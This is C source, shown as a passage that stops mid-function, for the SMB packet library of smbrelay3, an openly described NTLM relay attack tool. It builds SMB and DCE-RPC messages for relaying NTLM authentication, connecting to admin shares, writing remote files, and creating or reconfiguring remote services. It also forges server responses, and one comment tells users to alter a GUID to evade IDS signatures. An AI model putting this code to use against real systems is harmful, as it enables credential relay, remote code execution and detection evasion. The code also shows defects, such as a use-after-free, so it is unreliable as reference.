/* $Id$  
SMBRELAY - Small SMB Library packet generation.

Author: Andres Tarasco - (atarasco at gmail.com )
URL:		http://www.tarasco.org

This is not a complete library, but its functional for sending special crafted messages needed to perform attacks with smbrelay3
Lots of improvements need to be done but at this time works for me. 
Currently the following messages are supported:	

a) SMB NTLM Authentication  (SessionSetupAndX)
b) Connecting To resources (like c$, ipc$, admin$, pipes, ...) (TreeConnectAndX )
c) Opening remote Files for Writting (by default) and reading (NtCreateAndX)
d) Writting remote files (WriteAndX)
e) Service Control Manager (Connnect, open, start, stop and modify service)

Data structures have been added by reversing Raw dumps with the help of ethereal disectors. 
NOTE: RPCBinds are hardcoded under non WIN32 Enviroments.

*/

#define _CRT_SECURE_NO_DEPRECATE
#include "ntlm.h"
#include "smb.h"
#include "misc.h"
#ifdef WIN32
#include <rpcdce.h>
#pragma comment (lib,"rpcrt4")
#endif
uint16 UserID=0;
uint16 MultpleID=0;

 void SetEnviroment(uint16 sessionUserID, uint16 sessionTreeID, uint16 sessionFID) {
    if (sessionUserID) UserID=sessionUserID;
}
//uint32 test;

// Services Stub Generation
int InitDataBlock(DataBlock *block,char *data) {
    memset(block,'\0',sizeof(DataBlock));
    block->Lenght=strlen(data)+1;
    block->MaxLenLow=block->Lenght;
    block->MaxLenHigh=0;
    chartoWide((char*)block->data,(char*)data,(int)strlen(data) );
    return( sizeof(DataBlock) -sizeof(block->data) + 2*block->Lenght +  2* (block->Lenght%2 ==1) );
}

int CreateServiceWStub(char *destionation,char *ContextHandle,char *ServiceName, char *ServiceDescription,char *path, int StartType, int ServiceType){


    char *p;
    int len1, len2, len3;
    CreateServiceWStruct *CreateServiceWMsg=(CreateServiceWStruct *)destionation;
    CreateServiceWStruct *Message=(CreateServiceWStruct*)malloc(sizeof(CreateServiceWStruct));
    memset((char*)Message,0,sizeof(CreateServiceWStruct));    
    memcpy((char*)Message->ContextHandle,(char*)ContextHandle,20);
   
    len1=InitDataBlock(&Message->ServiceName,ServiceName);
    Message->unknown=0x00020000;
    len2=InitDataBlock(&Message->ServiceDescription,ServiceDescription);
    Message->unknown1=0x000f01ff;
    Message->StartType=StartType;
    Message->ServiceType=ServiceType;
    //Message->unknown2=
    len3=InitDataBlock(&Message->path,path);
    
    p=(char*)CreateServiceWMsg;
    memcpy((char*)p,(char*)Message,sizeof(CreateServiceWStruct));
    p=p + 20 + len1;
    memcpy((char*)p ,(char*)&Message->unknown,4 +len2);
    p= p + 4 +len2;
    memcpy(p,(char*)&Message->unknown1,sizeof(CreateServiceWStruct));
    p = p + 4*4 + len3;
    memcpy(p,(char*)&Message->blank,28);
    free(Message);
    return ( sizeof(CreateServiceWStruct) - sizeof(DataBlock)*3 +len1 + len2 + len3);    
    free(Message);

}


int ChangeServiceConfigWStub(char *destionation,char *ContextHandle,char *path, int StartType, int ServiceType) {

    ChangeServiceConfigWStruct *ChangeServiceConfigWMessage=(ChangeServiceConfigWStruct *)destionation;
    memset((char*)ChangeServiceConfigWMessage,'\0',sizeof(ChangeServiceConfigWStruct));
    memcpy((char*)ChangeServiceConfigWMessage->ContextHandle,(char*)ContextHandle,20);
    ChangeServiceConfigWMessage->StartType=StartType;
    ChangeServiceConfigWMessage->ServiceType=ServiceType;
    ChangeServiceConfigWMessage->unknown1=0x00000000; //maybe error parameter ?
    ChangeServiceConfigWMessage->unknown2=0x0000;
    ChangeServiceConfigWMessage->unknown3=0x02;
    ChangeServiceConfigWMessage->MaxLenLow=strlen(path)+1;
    ChangeServiceConfigWMessage->MaxLenHigh=0;
    ChangeServiceConfigWMessage->Lenght=strlen(path)+1;
    chartoWide((char*)&ChangeServiceConfigWMessage->buffer,(char*)path,(int)strlen(path) );
    return( sizeof(ChangeServiceConfigWStruct) - sizeof(ChangeServiceConfigWMessage->buffer) + ChangeServiceConfigWMessage->MaxLenLow*2  + 2*((((int)strlen((char*)path)+1)%2) ==1));
}

int OpenServiceWStub(char *destionation,char *ContextHandle,char *servicename,  int flags)
{    
    /*
    Function: OpenServiceWStub() 
              Genera el Stub de una llamada OpenServiceW() para incluirlo en un paquete SMB.
    Parameters:
     [out] OpenServiceAMessage: Stub resultante
     [int] ContextHandle: 20 bytes Handle (devuelto en una llamada OpenServiceManager()
     [in] Servicename:  string que contiene el nombre de servicio a abrir.
     [in] flags: Flags de la llamada OpenServiceW()

     Result value:
        size of the stub data packet
    */
    int len1;
    OpenServiceAStruct *OpenServiceAMessage = (OpenServiceAStruct *)destionation;

    memset((char*)OpenServiceAMessage,'\0',sizeof(OpenServiceAStruct));
    len1=InitDataBlock(&OpenServiceAMessage->ServiceName,servicename);
    OpenServiceAMessage->flags=flags;
    memcpy((char*)OpenServiceAMessage->ContextHandle,(char*)ContextHandle,20);
    memcpy((char*)OpenServiceAMessage +20 +len1,&OpenServiceAMessage->flags,4);
    return ( 24 +len1);//sizeof(OpenServiceAStruct) - sizeof(OpenServiceAMessage->buffer) + (OpenServiceAMessage->Lenght)*2  );
}


int OpenScManagerWStub(char *destionation, char *data, int flags) 
{
    /*
    Function: OpenScManagerWStub() - Genera el Stub de una llamada OpenScManagerW() para incluirlo en un paquete SMB.
    Parameters:
     [out] Mscstruct: Stub resultante
     [in] data:  string que contiene el nombre de service Manager a abrir.
     [in] flags: Flags de la llamada OpenScManagerW()

     Result value: size of the stub data packet

    */    
    MSCStruct *Mscstruct=(MSCStruct *)destionation;
    memset(Mscstruct,'\0',sizeof(MSCStruct));
	Mscstruct->ReferentID=0x00020000;					
	Mscstruct->MaxCount=(uint32)strlen((char*)data)+1;//0x07;
	Mscstruct->Offset=0;
	Mscstruct->ActualCount=(uint32)strlen((char*)data)+1;//0x07;
	Mscstruct->Database=0x00000000;
	Mscstruct->AccessMask=flags;

    //This data is optional. looks that its not checked
	chartoWide((char*)&Mscstruct->lpFileNameW,(char*)data,(int)strlen(data) );

	memcpy((char*)Mscstruct + sizeof(MSCStruct) - sizeof(Mscstruct->lpFileNameW) -8 + 2*((((int)strlen((char*)data)+1)%2) ==1) +(strlen((char*)data)+1)*sizeof(WCHAR),(char*)&Mscstruct->Database,8 );
    return (24 + (uint32)(strlen((char*)data)+1)*sizeof(WCHAR) + 2*((((int)strlen((char*)data)+1)%2) ==1));

}



int BuildTreeConnectAndXStub(char *destination,char *password, char *resource, char *service)
{
    TreeConnectAndX *message=(TreeConnectAndX*)destination;
    smheader *foo;
    message->WordCount=(uint16)4;
    message->AndXCommand=0xff;
    message->reserved2=0;    
    message->AndXOffset = sizeof(TreeConnectAndX) + strlen(password) + strlen(service)+1 + (strlen((char*)resource)+1)*sizeof(WCHAR) +          sizeof(smheader) - sizeof(foo->buffer) -4;
    message->flags=0x8;
    message->PasswordLen=strlen(password)+1;
    message->ByteCount = (strlen(resource)+1 )*sizeof(WCHAR) + message->PasswordLen +strlen(service)+1;
    memcpy((char*)&message->Password,password,message->PasswordLen);
    chartoWide((char*)&message->Password + message->PasswordLen,(char*)resource,(int)strlen((char*)resource) +1 );
    memcpy(destination+sizeof(TreeConnectAndX) + (strlen((char*)resource)+1)*sizeof(WCHAR) ,service,strlen(service)+1);//"\x3f\x3f\x3f\x3f\x3f\x00",6);
    
    return( sizeof(TreeConnectAndX) + strlen(password) + strlen(service)+1 + (strlen((char*)resource)+1)*sizeof(WCHAR) );

}

char *AddDialect(char *data, char *name, uint8 type, int *PacketSize) {

    if (!data) {
        *PacketSize=0;
        data=(char*)malloc(strlen(name)+2);
    } else {
        data=(char*)realloc(data, *PacketSize +2 + strlen(name));
    }
    //printf("PacketSize vale: %i\n",*PacketSize);
    data[*PacketSize]=type;
    strcpy((char*)&data[*PacketSize+1],name);
    *PacketSize+=2+strlen(name);
    return(data);
}


#ifdef WIN32
CtxItem *AddBinddingInformation(CtxItem *CurrentCtx, char *Abstract, char *Transfer, int MayorVersion, int MinorVersion,int *PacketSize)
{
    CtxItem *ctx=CurrentCtx;
    int i=0;
    if (!ctx){
        ctx=(CtxItem*)malloc(sizeof(CtxItem));
        *PacketSize=0;
    } else {
        ctx=(CtxItem*)realloc(ctx,*PacketSize +sizeof(CtxItem));
    }
    
    i=*PacketSize/sizeof(CtxItem);
    *PacketSize+=sizeof(CtxItem);
    ctx[i].ContextID=i;
    ctx[i].NumberOfTransItems=1;	
    ctx[i].padding=0;
    ctx[i].AbstractSyntaxis.MayorVersion=MayorVersion;
	ctx[i].AbstractSyntaxis.MinorVersion=MinorVersion;
    UuidFromStringA((unsigned char *)Abstract, (UUID   *) &ctx[i].AbstractSyntaxis.uuid[0]);
    ctx[i].TransferSyntaxis.MayorVersion=MayorVersion;
	ctx[i].TransferSyntaxis.MinorVersion=MinorVersion;
    UuidFromStringA((unsigned char *)Transfer, (UUID   *)&ctx[i].TransferSyntaxis.uuid[0]);
    return(ctx);
}
#endif

smheader *BuildSmbPacket(smheader *PreviousSmbMessage,uint8 SmbCommand,uint8 SubCommand, void *data, int DataSize) 
{


	smheader *NewSmbPacket;
	WCHAR tail1[18];
	WCHAR tail2[17];

	//Parameters Supported:
	SessionSetupAndX *SessionSetupAndXMessage;
	SessionSetupAndXResponse *SessionSetupAndXResponseMessage; 
//	TreeConnectAndX  *TreeConnectAndXMessage;
	FIND_FIRST2		 *FIND_FIRST2Message;
	NTCreateAndX	 *NTCreateAndXMessage;
	WriteAndX		 *WriteAndXMessage;
	SMB_COM_TRANSACTION_STRUCT 	 *TransRequest;//
	ReadAndX		 *ReadAndXMessage;
	CLOSE			 *CloseMessage;

	//dce
	DceRpcBind		 *dcerpcbind;
//	CtxItem			 *ctx;
	DceRpcRequest	 *dcerpc;

	//other variables
	WCHAR lpFileNameW[256];
//	int		i,j;



	NewSmbPacket=(smheader*)malloc(sizeof(smheader));    
	memset((char*)NewSmbPacket,'\0',sizeof(smheader));
	NewSmbPacket->SmbMessageType=0x0000;

    //0xFF for SMBv1 and 0xFE for SMBv2 (TODO)
	memcpy((char*)NewSmbPacket->ProtocolHeader,"\xff\x53\x4d\x42",4); //"?SMB"
	NewSmbPacket->SmbCommand=SmbCommand;
	NewSmbPacket->flags=0x18;
    NewSmbPacket->flags2=0xc803; //LOWEST SMB FLAGS with Unicode
    //NewSmbPacket->flags2=0x4803;
//    NewSmbPacket->flags2=0xc802;

    NewSmbPacket->ProccessID=0xfeff;
	//NewSmbPacket->ProccessID=6666;
/*
	if (SmbCommand==SESSIONSETUPANDX) { //Init UserID value
		if (PreviousSmbMessage!=NULL)  {
			UserID=PreviousSmbMessage->UserID;
            printf("estableciendo UserID: %i\n",UserID);
		} 
	}
    */

	NewSmbPacket->UserID=UserID;
	NewSmbPacket->multipleID=MultpleID; 
	MultpleID+=64;


    if (DataSize > sizeof(NewSmbPacket->buffer)) {
        NewSmbPacket=(smheader*)realloc(NewSmbPacket,sizeof(smheader) + DataSize);

     }
	


	switch(SmbCommand)
	{

	case NEGOTIATEPROTOCOLREQUEST:
        UserID=0;
		MultpleID=0;
        if (SubCommand==CONTINUERESPONSE) {
            /*
                Generates an SMB Negotiate Protocol Response.
                This packet is needed when acting as an SMB Server.
                NOTE: If the original reponse from the client is sent, the server could force logoff due to kerberos authentication failure.
                 so we need to create our own packet with an unknown Computer GUID
            */
			NewSmbPacket->flags=0x98;
            NegotiateProtocolResponse *NegotiateProtocolResponseMessage;
		    NegotiateProtocolResponseMessage=(NegotiateProtocolResponse *)malloc(sizeof(NegotiateProtocolResponse));
		    memset((char*)NegotiateProtocolResponseMessage,'\0',sizeof(NegotiateProtocolResponse));
            NewSmbPacket->SmbMessageLength=SREV(85);
            NegotiateProtocolResponseMessage->WordCount=17;
            NegotiateProtocolResponseMessage->DialecIndex=5; //grater than lanman2.1
            NegotiateProtocolResponseMessage->SecurityMode=0x03; // User Security Mode + Password encrypted
            NegotiateProtocolResponseMessage->MaxMxpCount=50;
            NegotiateProtocolResponseMessage->MaxVcs=1;
            NegotiateProtocolResponseMessage->MaxBufferSize=16644;
            NegotiateProtocolResponseMessage->MaxRawBuffer=65536;
            NegotiateProtocolResponseMessage->SessionKey=0x00000000;
            NegotiateProtocolResponseMessage->Capabilities=0x8001f3fd;
            //FIX and set a valid ServerTime.
            //NegotiateProtocolResponseMessage->ServerTime=0; 
            NegotiateProtocolResponseMessage->ServerTimeZone=0x0000;
            NegotiateProtocolResponseMessage->KeyLength=0;
            NegotiateProtocolResponseMessage->ByteCount=16;
            //TODO: Generate Random SMBRELAY Server GUID.
            //change it to avoid IDS Signatures :)
            memcpy(NegotiateProtocolResponseMessage->ServerGuid,"\xef\xea\x7f\x5b\xe2\x0a\x4e\x4d\xad\xee\xa6\\x29\x15\\xab",16);
            memcpy(NewSmbPacket->buffer,(char*)NegotiateProtocolResponseMessage,sizeof(NegotiateProtocolResponse));
            free(NegotiateProtocolResponseMessage);

        } else {/* Generates an SMB Negotiate Protocol Response. This packet is needed when acting as an SMB Client.         */
            NegotiateProtocolRequest* NegotiateProtocolRequestMessage;
		    NegotiateProtocolRequestMessage=(NegotiateProtocolRequest *)malloc(sizeof(NegotiateProtocolRequest));
		    memset((char*)NegotiateProtocolRequestMessage,'\0',sizeof(NegotiateProtocolRequest));
		    NewSmbPacket->SmbMessageLength=SREV(35 + DataSize);
            if (DataSize > ( sizeof(NewSmbPacket->buffer) - sizeof(NegotiateProtocolRequest) + sizeof(DIALECT*) )) 
            {
                NewSmbPacket=(smheader*)realloc(NewSmbPacket,sizeof(smheader) -sizeof(NewSmbPacket->buffer) + sizeof(NegotiateProtocolRequest) +DataSize );

            }
		    NegotiateProtocolRequestMessage->WordCount=0;
            NegotiateProtocolRequestMessage->ByteCount=DataSize;
		    memcpy(NewSmbPacket->buffer,(char*)NegotiateProtocolRequestMessage,sizeof(NegotiateProtocolRequest)-sizeof(DIALECT*) );
            memcpy(NewSmbPacket->buffer + sizeof(NegotiateProtocolRequest)-sizeof(DIALECT*) ,data, DataSize);
            free(NegotiateProtocolRequestMessage);
        }
		break;

	case FINDFIRST2:

		FIND_FIRST2Message=(FIND_FIRST2 *)malloc(sizeof(FIND_FIRST2));
        if (DataSize > sizeof(NewSmbPacket->buffer)) {
            NewSmbPacket=(smheader*)realloc(NewSmbPacket,sizeof(smheader) + DataSize);

        }
		memset((char*)FIND_FIRST2Message,'\0',sizeof(FIND_FIRST2));
        NewSmbPacket->SmbMessageLength=SREV (sizeof(smheader)- sizeof(NewSmbPacket->buffer) +sizeof(FIND_FIRST2) -sizeof(FIND_FIRST2Message->SearchPattern) + (DataSize+1)*2   -4 );
		if (PreviousSmbMessage!=NULL){
			NewSmbPacket->TreeId=((smheader *)PreviousSmbMessage)->TreeId;
		}

		FIND_FIRST2Message->WordCount=15;
		FIND_FIRST2Message->TotalParameterCount=18;
		FIND_FIRST2Message->TotalDataCount=0;
		FIND_FIRST2Message->MaxParameterCount=10;
		FIND_FIRST2Message->MaxDataCount=16384;
		FIND_FIRST2Message->MaxSetupCount=0;
		FIND_FIRST2Message->reserved=0;
		FIND_FIRST2Message->flags=0x0000;
		FIND_FIRST2Message->timeout=0; //No Timeout
		FIND_FIRST2Message->reserved2=0;
        FIND_FIRST2Message->ParameterCount=12 + (DataSize+1)*2;//18; //sizeo of Find_First2 struct
		FIND_FIRST2Message->ParameterOffset=68; //default offset. We are only sending static messages
		FIND_FIRST2Message->DataCount=0;
		FIND_FIRST2Message->DataOffset=0;
		FIND_FIRST2Message->SetupCount=1;
		FIND_FIRST2Message->reserved3=0;
		FIND_FIRST2Message->SubCommand=0x01; //FIND_FIRST2
        //4 setfs quote
		FIND_FIRST2Message->ByteCount=3+ 12 + (DataSize+1)*2;//21; //sizeof(->find_First2 + Padding )

        FIND_FIRST2Message->SearchAttributes=0x16;
        FIND_FIRST2Message->SearchCount=1366;
        FIND_FIRST2Message->Searchflags=0x0006;
        FIND_FIRST2Message->LevelOfInterest=260;
        FIND_FIRST2Message->StorageType=0;
        
        FIND_FIRST2Message->SearchPattern=(uint8*)malloc((DataSize+1)*2);
        memset(FIND_FIRST2Message->SearchPattern,'\0',(DataSize+1)*2);

        chartoWide((char*)FIND_FIRST2Message->SearchPattern,(char*)data,DataSize );
        //memcpy((char*)&FIND_FIRST2Message->SearchAttributes,(char*)FIND_FIRST2Message->SearchPattern,12 );
        /*
        memcpy((char*)&FIND_FIRST2Message->SearchPattern[0],(char*)data,DataSize );
        memcpy((char*)&FIND_FIRST2Message->SearchPattern[DataSize],(char*)data,DataSize );
        */


        memcpy(NewSmbPacket->buffer,(char*)FIND_FIRST2Message, 48);// + (DataSize+1)*2);//sizeof(FIND_FIRST2));
        memcpy(NewSmbPacket->buffer +48,(char*)FIND_FIRST2Message->SearchPattern, (DataSize+1)*2);//
        free(FIND_FIRST2Message);
        free(FIND_FIRST2Message->SearchPattern);
		break;

	case NTCREATEANDX:
		NTCreateAndXMessage=(NTCreateAndX *)malloc(sizeof(NTCreateAndX));
		memset((char*)NTCreateAndXMessage,'\0',sizeof(NTCreateAndX));
		NewSmbPacket->SmbMessageLength=(uint16)SREV (sizeof(smheader)-sizeof(NewSmbPacket->buffer) +sizeof(NTCreateAndX) + (strlen((char*)data)+1)*sizeof(WCHAR) -4 );

		NewSmbPacket->TreeId=((smheader *)PreviousSmbMessage)->TreeId;
		NTCreateAndXMessage->WordCount=24;
		NTCreateAndXMessage->AndXCommand=0xff; //0xff no further command
		NTCreateAndXMessage->reserved2=0; 
		NTCreateAndXMessage->AndXOffset=0xdede;  
		NTCreateAndXMessage->FilenameLen=(uint16)(strlen((char*)data))*sizeof(WCHAR);
		NTCreateAndXMessage->CreationFlags=0x16;
		NTCreateAndXMessage->RootFID=0;

		//We call readFileToSend with response+1 because filename is in the following format " \ + filename"
		NTCreateAndXMessage->AllocationSize=DataSize;//ReadFileToSend(NULL,(char*)data+1);
		NTCreateAndXMessage->AllocationSizeHigh=0;	
		NTCreateAndXMessage->Impersonation=0x02;
		NTCreateAndXMessage->SecurityFlags=0x03;

		if (DataSize==0){ //pipe
			NTCreateAndXMessage->ShareAccess=0x03; //SHARE_READ & SHARE_WRITE
			NTCreateAndXMessage->Disposition=0x01;
			NTCreateAndXMessage->CreateOptions=0x00400040;
			NTCreateAndXMessage->AccessMask=0x0002019f;
			NTCreateAndXMessage->FileAttributes=0;
		} else { //file
			NTCreateAndXMessage->ShareAccess=0;
			NTCreateAndXMessage->Disposition=0x05; //overwrite + create
			NTCreateAndXMessage->CreateOptions=0x44;
			NTCreateAndXMessage->AccessMask=0x30196;
			NTCreateAndXMessage->FileAttributes=0x20;
		}

		NTCreateAndXMessage->ByteCount=NTCreateAndXMessage->FilenameLen+2+1; //Append wideNullChar and 1 extra byte
		NTCreateAndXMessage->padding=0;
		memcpy(NewSmbPacket->buffer,(char*)NTCreateAndXMessage,sizeof(NTCreateAndX));

		memset((char*)lpFileNameW,'\0',sizeof(lpFileNameW));
		//		mbstowcs(lpFileNameW,(char*)data,strlen((char*)data) );
		chartoWide((char*)lpFileNameW,(char*)data,(int)strlen((char*)data) );
#ifdef _DBG_
		printf("Data: %S\n",lpFileNameW);
#endif
		memcpy(NewSmbPacket->buffer+sizeof(NTCreateAndX),(char*)lpFileNameW,(strlen((char*)data)+1)*sizeof(WCHAR) );
        free(NTCreateAndXMessage);
		break;




	case SMBCLOSE:
		CloseMessage=(CLOSE *)malloc(sizeof(CLOSE));
		memset((char*)CloseMessage,'\0',sizeof(CLOSE));
        
		NewSmbPacket->SmbMessageLength=SREV (sizeof(smheader)-sizeof(NewSmbPacket->buffer) +sizeof(CLOSE)  -4 );

		CloseMessage->ByteCount=0;
		CloseMessage->WordCount=3;
		CloseMessage->LastWrite=0xFFFFFFFF;
		memcpy((char*)&CloseMessage->FID,(char*)data,2);
		memcpy(NewSmbPacket->buffer,(char*)CloseMessage,sizeof(CLOSE));	
        free(CloseMessage);
		break;



	case READANDX:
		ReadAndXMessage=(ReadAndX *)malloc(sizeof(ReadAndX));
		memset((char*)ReadAndXMessage,'\0',sizeof(ReadAndX));
		NewSmbPacket->SmbMessageLength=SREV (sizeof(smheader)-sizeof(NewSmbPacket->buffer) +sizeof(ReadAndX) -4 );
		NewSmbPacket->TreeId=((smheader *)PreviousSmbMessage)->TreeId;
    
		ReadAndXMessage->WordCount=12;
		ReadAndXMessage->AndXCommand=0xff; //0xff no further command
		ReadAndXMessage->reserved2=0x00; 
		ReadAndXMessage->AndXOffset=0xdede; 
		//ReadAndXMessage->FID este valor lo rellenamos fuera dado que aqui no tenemos la información  necesaria. Es el identificador del ultimo fichero abierto.
		/*
		NTCreateAndXMessage = (NTCreateAndX*)SmbMessage->buffer;
		memcpy(&ReadAndXMessage->FID,(char*)NTCreateAndXMessage+6,2);
		*/
		//		printf("FID: %4.4x\n",ReadAndXMessage->FID);
		ReadAndXMessage->offset=0x00000000;
		ReadAndXMessage->MaxCountLow=1024;
		ReadAndXMessage->MinCount=1024;
		ReadAndXMessage->reserved=0xffffffff;
		ReadAndXMessage->remaining=1024;
		ReadAndXMessage->HighOffset=0;
		ReadAndXMessage->ByteCount=0;
		memcpy(NewSmbPacket->buffer,(char*)ReadAndXMessage,sizeof(ReadAndX));
        free(ReadAndXMessage);
		break;



	case WRITEANDX:
		WriteAndXMessage=(WriteAndX *)malloc(sizeof(WriteAndX));
		memset((char*)WriteAndXMessage,'\0',sizeof(WriteAndX));
		NTCreateAndXMessage = (NTCreateAndX*)PreviousSmbMessage->buffer;
		NewSmbPacket->TreeId=((smheader *)PreviousSmbMessage)->TreeId;
		WriteAndXMessage->WordCount=14;
		WriteAndXMessage->AndXCommand=0xff;
		WriteAndXMessage->reserved2=0;
		WriteAndXMessage->AndXOffset=0xdede;
		memcpy(&WriteAndXMessage->FID,(char*)NTCreateAndXMessage+6,2);

		WriteAndXMessage->Offset=0;
		WriteAndXMessage->reserved=0xffffffff;
		WriteAndXMessage->DataLengthHigh=0;
		WriteAndXMessage->DataOffset=64;
		WriteAndXMessage->HighOffset=0;
		WriteAndXMessage->Padding=0xee;	

		switch (SubCommand)
		{
		case 0: //Default WriteAndX Operation
			NewSmbPacket->SmbMessageLength=(uint16)SREV (sizeof(smheader)-sizeof(NewSmbPacket->buffer) +sizeof(WriteAndX) +DataSize -4 );
			WriteAndXMessage->WriteMode=0;
			WriteAndXMessage->Remaining=0;
			WriteAndXMessage->DataLengthLow=DataSize;
			WriteAndXMessage->ByteCount=DataSize+1;
			memcpy(NewSmbPacket->buffer,(char*)WriteAndXMessage,sizeof(WriteAndX));
			memcpy(NewSmbPacket->buffer+sizeof(WriteAndX),(char*)data,DataSize);
            free(WriteAndXMessage);
			break;
		case  RPCBIND:
			//i=116; //size of the ctx struct + dce
			//Interface: SVCCTL UUID: 367abb81-9844-35f1-ad32-98f038001003
			//Transfer Syntax: 8a885d04-1ceb-11c9-9fe8-08002b104860
            
			//Transfer Syntax: 6cb71c2c-9812-4540-0100-000000000000
            //ctx=AddBinddingInformation(ctx,"367abb81-9844-35f1-ad32-98f038001003","6cb71c2c-9812-4540-0100-000000000000",2,0,&i);
            //DumpMem((char*)ctx,i);
			//NewSmbPacket->SmbMessageLength=SREV (sizeof(smheader)-sizeof(NewSmbPacket->buffer) +sizeof(WriteAndX) + sizeof(DceRpcBind) + i -4);
            NewSmbPacket->SmbMessageLength=SREV (sizeof(smheader)-sizeof(NewSmbPacket->buffer) +sizeof(WriteAndX) + sizeof(DceRpcBind) + DataSize -4);
			WriteAndXMessage->WriteMode=0x08;
			WriteAndXMessage->Remaining=DataSize + sizeof(DceRpcBind);
			WriteAndXMessage->DataLengthLow=DataSize + sizeof(DceRpcBind);
			WriteAndXMessage->ByteCount=DataSize+ sizeof(DceRpcBind) +1;
			memcpy(NewSmbPacket->buffer,(char*)WriteAndXMessage,sizeof(WriteAndX));

			dcerpcbind=(DceRpcBind*)malloc(sizeof(DceRpcBind));
			memset((char*)dcerpcbind,'\0',sizeof(DceRpcBind));
			dcerpcbind->VersionMayor=5;
			dcerpcbind->VersionMinor=0;
			dcerpcbind->PacketType=SubCommand; //Bind
			dcerpcbind->PacketFlags=0x03;
			dcerpcbind->DataRepresentation=0x00000010;
			dcerpcbind->FragmentLength=sizeof(DceRpcBind) + DataSize;
			dcerpcbind->AuthLength=0;
			dcerpcbind->CallID=1;
			dcerpcbind->MaxXmitFragment=4280;
			dcerpcbind->MaxRecvFragment=4280;
			dcerpcbind->AssocGroup=0;
            dcerpcbind->NumberOfCtx=DataSize / sizeof(CtxItem);
            
			memcpy(NewSmbPacket->buffer +sizeof(WriteAndX) ,(char*)dcerpcbind,sizeof(DceRpcBind));
            memcpy(NewSmbPacket->buffer +sizeof(WriteAndX) + sizeof(DceRpcBind),(char*)data,DataSize);
            
            free(dcerpcbind);
            free(WriteAndXMessage);
			break;
		default:
			printf("Unsupported WriteAndX option\n");
			return(NULL);
			break;
		}		
		break;


	case SMB_COM_TRANSACTION:
		TransRequest=(SMB_COM_TRANSACTION_STRUCT *)malloc(sizeof(SMB_COM_TRANSACTION_STRUCT));
		memset((char*)TransRequest,'\0',sizeof(SMB_COM_TRANSACTION_STRUCT));
		NewSmbPacket->TreeId=((smheader *)PreviousSmbMessage)->TreeId;
		TransRequest->WordCount=16;
		TransRequest->TotalParameterCount=0 ;
		TransRequest->MaxDataCount=1024;
		TransRequest->MaxParameterCount=0;
		TransRequest->MaxSetupCount=0;
		TransRequest->reserved=0;
		TransRequest->flags=0;
		TransRequest->timeout=0x00000000;
		TransRequest->reserved2=0;
		TransRequest->ParameterCount=0;
		TransRequest->ParameterOffset=84;
		TransRequest->DataOffset=84;
		TransRequest->SetupCount=2; 
		TransRequest->reserved3=0;

        TransRequest->Function=0x26; //TRANSACT Named PIPE
		TransRequest->padding=0;		
		memcpy((char*)TransRequest->TransactionName,"\x5c\x00\x50\x00\x49\x00\x50\x00\x45\x00\x5c\x00\x00\x00",14);
		TransRequest->padding2=0;

        dcerpc=(DceRpcRequest*)malloc(sizeof(DceRpcRequest));
		memset((char*)dcerpc,'\0',sizeof(DceRpcRequest));
		dcerpc->VersionMayor=5;
		dcerpc->VersionMinor=0;
		dcerpc->PacketType=0;
		dcerpc->PacketFlags=3;
		dcerpc->DataRepresentation=0x00000010;
		dcerpc->AuthLength=0;
		dcerpc->CallID=1;
		dcerpc->ContextID=0;
		dcerpc->OpNum=SubCommand;
        //--------

        NewSmbPacket->SmbMessageLength=(uint16)SREV (sizeof(smheader)-sizeof(NewSmbPacket->buffer) +sizeof(SMB_COM_TRANSACTION_STRUCT) + sizeof(DceRpcRequest) + DataSize -4);	
        TransRequest->TotalDataCount=(uint16)sizeof(DceRpcRequest) + DataSize;//sizeof(MSCStruct) + (uint16) (strlen((char*)data)+1)*sizeof(WCHAR) + 2*((((int)strlen((char*)data)+1)%2) ==1)  ;	
		TransRequest->DataCount=TransRequest->TotalDataCount;				
		TransRequest->ByteCount=TransRequest->TotalDataCount + 17; 					
		dcerpc->FragmentLength=TransRequest->TotalDataCount;					
        //dcerpc->AllocHint=sizeof(DceRpcRequest) +DataSize; //Changed 10, Sept
		dcerpc->AllocHint=DataSize; 

		memcpy(NewSmbPacket->buffer,(char*)TransRequest,sizeof(SMB_COM_TRANSACTION_STRUCT));
		memcpy(NewSmbPacket->buffer+sizeof(SMB_COM_TRANSACTION_STRUCT),(char*)dcerpc,sizeof(DceRpcRequest));
        memcpy(NewSmbPacket->buffer+sizeof(SMB_COM_TRANSACTION_STRUCT) +sizeof(DceRpcRequest),(char*)data,DataSize);
        free(TransRequest);
		free(dcerpc);
		break;


	case SESSIONSETUPANDX:
		if (SubCommand==ERRORRESPONSE) { 
			NewSmbPacket->SmbMessageLength=(uint16)SREV (sizeof(smheader)-sizeof(NewSmbPacket->buffer) + 3  -4 );
			NewSmbPacket->NtStatus=0xc000006d;
			NewSmbPacket->UserID=PreviousSmbMessage->UserID;

		} else {
            if (PreviousSmbMessage!=NULL) NewSmbPacket->UserID = UserID =PreviousSmbMessage->UserID; //Init UserID parameter

			memset((char*)tail1,'\0',sizeof(tail1));
			memset((char*)tail2,'\0',sizeof(tail2));
			chartoWide((char*)tail1,"Windows 2000 2195",17);
			chartoWide((char*)tail2,"Windows 2000 5.0",16);

			if (SubCommand==CONTINUERESPONSE) {
				SessionSetupAndXResponseMessage=(SessionSetupAndXResponse *)malloc(sizeof(SessionSetupAndXResponse));
				memset((char*)SessionSetupAndXResponseMessage,'\0',sizeof(SessionSetupAndXResponse));
				//SessionSetupAndXResponse *SessionSetupAndXResponseMessage; 
				//NewSmbPacket->SmbMessageLength=(uint16)SREV (sizeof(smheader)-sizeof(NewSmbPacket->buffer) + sizeof(SessionSetupAndXResponse) + sizeof(tail1) + sizeof(tail2)  -4 );
                NewSmbPacket->SmbMessageLength=SREV (sizeof(smheader)-sizeof(NewSmbPacket->buffer) + sizeof(SessionSetupAndXResponse) + sizeof(tail1) + sizeof(tail2)  -4 );                
				NewSmbPacket->NtStatus=0;
				//DumpMem((char*)&PreviousSmbMessage->UserID,0x30);
				//printf("El otro userID es: %i\n",PreviousSmbMessage->UserID);
				//memcpy((char*)&NewSmbPacket->UserID,(char*)&PreviousSmbMessage->UserID,2);
				NewSmbPacket->UserID=PreviousSmbMessage->UserID;
				SessionSetupAndXResponseMessage->WordCount=4;
				SessionSetupAndXResponseMessage->AndXCommand=0xff;
				SessionSetupAndXResponseMessage->AndXOffset=SREV(NewSmbPacket->SmbMessageLength);
				SessionSetupAndXResponseMessage->ByteCount=sizeof(tail1)+sizeof(tail2);
				memcpy(NewSmbPacket->buffer,(char*)SessionSetupAndXResponseMessage,sizeof(SessionSetupAndXResponse));
				memcpy(NewSmbPacket->buffer +sizeof(SessionSetupAndXResponse) +1,(char*)tail1,sizeof(tail1));
